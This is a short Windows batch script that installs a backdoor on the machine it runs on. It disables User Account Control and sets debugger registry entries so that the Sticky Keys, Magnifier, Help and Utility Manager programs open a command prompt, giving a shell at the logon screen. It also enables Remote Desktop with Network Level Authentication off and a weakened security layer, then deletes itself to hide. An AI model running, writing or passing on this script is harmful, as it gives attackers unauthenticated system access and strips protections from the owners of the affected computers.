@echo off
cls
rem ##########################################################
rem disable uac
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
rem ##########################################################

rem ##########################################################
rem new installer with exploit
rem create a exploitable directory
rem install to reg
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f /v Debugger /t REG_SZ /d "%windir%\system32\cmd.exe"
rem #########################################################################
rem #########################################################################
rem disable NLa
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v fDenyTSConnections /t REG_DWORD /d "00000000"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v fAllowUnsolicited /t REG_DWORD /d "00000001"
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /f /v UserAuthentication /t REG_DWORD /d "00000000"
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v SecurityLayer /t REG_DWORD /d "00000001"
rem ##############################################################################
del %0
